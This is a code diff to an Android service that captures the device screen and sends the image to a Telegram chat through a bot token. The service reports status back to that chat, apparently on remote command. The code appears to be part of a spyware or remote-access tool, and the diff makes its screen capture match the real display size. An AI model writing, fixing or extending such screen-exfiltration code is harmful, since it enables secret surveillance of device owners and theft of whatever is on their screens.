@@ -13,7 +13,9 @@ import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
 import android.os.Build;
 import android.os.IBinder;
+import android.util.DisplayMetrics;
 import android.util.Log;
+import android.view.WindowManager;
 
 import java.io.File;
 import java.io.FileOutputStream;
@@ -78,50 +80,78 @@ public class ScreenCaptureService extends Service {
                 TelegramPoller.sendMessageStatic(chatId, "❌ نظامك لا يدعم لقطة الشاشة.");
                 return;
             }
+
             MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
             if (projectionManager == null || resultData == null) {
                 TelegramPoller.sendMessageStatic(chatId, "❌ صلاحية غير مفعلة.");
                 return;
             }
+
             mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);
             if (mediaProjection == null) {
                 TelegramPoller.sendMessageStatic(chatId, "❌ فشل MediaProjection.");
                 return;
             }
 
-            int width = 1080, height = 1920, density = getResources().getDisplayMetrics().densityDpi;
-            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1);
-            virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture", width, height, density,
-                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
+            // 🔥 الحصول على أبعاد الشاشة الفعلية
+            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+            DisplayMetrics metrics = new DisplayMetrics();
+            windowManager.getDefaultDisplay().getMetrics(metrics);
+            int width = metrics.widthPixels;
+            int height = metrics.heightPixels;
+            int density = metrics.densityDpi;
 
-            Thread.sleep(500);
+            // إنشاء ImageReader بدقة الشاشة الفعلية
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1);
+            virtualDisplay = mediaProjection.createVirtualDisplay(
+                    "ScreenCapture",
+                    width, height, density,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    imageReader.getSurface(),
+                    null, null
+            );
+
+            // الانتظار قليلاً لالتقاط الإطار
+            Thread.sleep(300);
+
             Image image = imageReader.acquireLatestImage();
             if (image == null) {
                 TelegramPoller.sendMessageStatic(chatId, "❌ صورة فارغة.");
                 return;
             }
 
+            // استخراج البيكسلات من الصورة
             Image.Plane[] planes = image.getPlanes();
             ByteBuffer buffer = planes[0].getBuffer();
             int pixelStride = planes[0].getPixelStride();
             int rowStride = planes[0].getRowStride();
             int rowPadding = rowStride - pixelStride * width;
 
-            Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
+            // إنشاء Bitmap بالحجم الصحيح
+            Bitmap bitmap = Bitmap.createBitmap(
+                    width + rowPadding / pixelStride,
+                    height,
+                    Bitmap.Config.ARGB_8888
+            );
             bitmap.copyPixelsFromBuffer(buffer);
+
+            // قص الصورة لإزالة الحشو (إن وجد)
             Bitmap finalBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
             bitmap.recycle();
 
+            // حفظ الصورة في ملف
             File screenshotFile = new File(getCacheDir(), "screenshot.png");
             FileOutputStream fos = new FileOutputStream(screenshotFile);
-            finalBitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
+            finalBitmap.compress(Bitmap.CompressFormat.PNG, 90, fos);
             fos.flush();
             fos.close();
             finalBitmap.recycle();
             image.close();
 
+            // إرسال الصورة عبر البوت
             TelegramPoller.sendPhotoStatic(chatId, screenshotFile, botToken);
 
+            // تنظيف الموارد
             if (virtualDisplay != null) virtualDisplay.release();
             if (mediaProjection != null) mediaProjection.stop();
             if (imageReader != null) imageReader.close();
@@ -144,4 +174,4 @@ public class ScreenCaptureService extends Service {
 
     @Override
     public IBinder onBind(Intent intent) { return null; }
-            } 
+                } 
